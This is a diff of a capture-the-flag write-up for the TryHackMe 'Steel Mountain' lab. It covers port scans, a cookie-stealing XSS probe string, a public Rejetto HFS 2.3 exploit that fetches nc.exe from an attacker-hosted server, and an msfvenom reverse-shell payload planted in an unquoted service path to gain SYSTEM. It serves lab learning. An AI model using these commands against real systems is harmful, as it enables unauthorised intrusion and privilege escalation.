@@ -9,7 +9,7 @@ tags: [ctf, security, hacking, exploits]
 Steel Mountain is a vulnerable machine from [TryHackMe](https://tryhackme.com) that requires some standard enumeration with setting up and running a couple of exploits. After you find the vulnerable services, the exploits and path to foothold and privilege escalation are straightforward. 
 
 ## Nmap Scan
-* nmap -T4 -p- <target ip>
+* nmap -T4 -p- `target ip`
     * PORT      STATE SERVICE
     * 80/tcp    open  http
     * 135/tcp   open  msrpc
@@ -26,14 +26,13 @@ Steel Mountain is a vulnerable machine from [TryHackMe](https://tryhackme.com) t
     * 49156/tcp open  unknown
     * 49169/tcp open  unknown
     * 49170/tcp open  unknown
-* nmap -T4 -sV -A -p 135,139,445,3389,8080 <target ip>
+* nmap -T4 -sV -A -p 135,139,445,3389,8080 `target ip`
     * 135/tcp  open  msrpc        Microsoft Windows RPC
     * 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
     * 445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
     * 3389/tcp open  ssl          Microsoft SChannel TLS
     * 5985/tcp  filtered wsman
     * 47001/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-    * |_http-server-header: Microsoft-HTTPAPI/2.0
     * 8080/tcp open http HttpFileServer httpd 2.3
 [Rejetto HFS](https://www.rejetto.com/hfs/)
 
@@ -42,21 +41,22 @@ Most of the ports open aren't terrible helpful to use, the unknowns we can ignor
 ## Checking out the Site
 We did find a login page on the site. There doesn't seem to be much we can do here without credentials:
 * http://10.10.243.11:8080/~login
+* Tried the standard admin:admin, didn't work. 
 
 ## Enumerating the Web Site
 Nikto Scan
 > nikto -h http://10.10.243.11:8080
-    OSVDB-38019: /?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS).
+>> `OSVDB-38019: /?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS).`
 
 Dirbuster
 > dirbuster dir -u http://10.10.243.11:8080/ -w /usr/share/wordlists/dirb/common.txt 
-    No interesting directories found on the site.
+>> No interesting directories found on the site.
 
 ## Vulnerable Service
 We do see this is Rejetto HttpFileServer 2.3 version. This has a vulnerability that exists both in `Metasploit` and a public python script. We can use searchsploit to find the public exploit: "searchsploit Rejetto 2.3"
 * More than one file may come up in your search, and I actually found a different script by mistake at first: `49125.py`
 * Took some attempts for me to figure out this is the wrong exploit, and instead the target public exploit is: `39161.py`
-    * #EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
+    * #EDB Note: You need to be using a web server hosting netcat (`http://<attackers_ip>:80/nc.exe`).
 
 Decoding some of the script, we can easily understand the intent: 
 ```java
@@ -117,7 +117,7 @@ At this point, the unquoted service path vulnerability seems to be the best choi
 Since `Advanced System Care` didn't have quotes, we throw a reverse shell into this file path as `Advanced.exe`. After we move the file into the path, we need to then stop and start the service that runs the files out of that path, which is service `AdvancedSystemCareService9`.
 
 > Craft payload with `msfvenom`:
->> msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4545 -f exe > Advanced.exe
+>> msfvenom -p windows/shell_reverse_tcp LHOST=`<ip>` LPORT=`4545` -f exe > Advanced.exe
 
 We transfer the payload over, put it in the correct path, and use sc start/stop to stop and start the service. Once this is done, we get our shell back, and are now `NT Authority\System`.
 
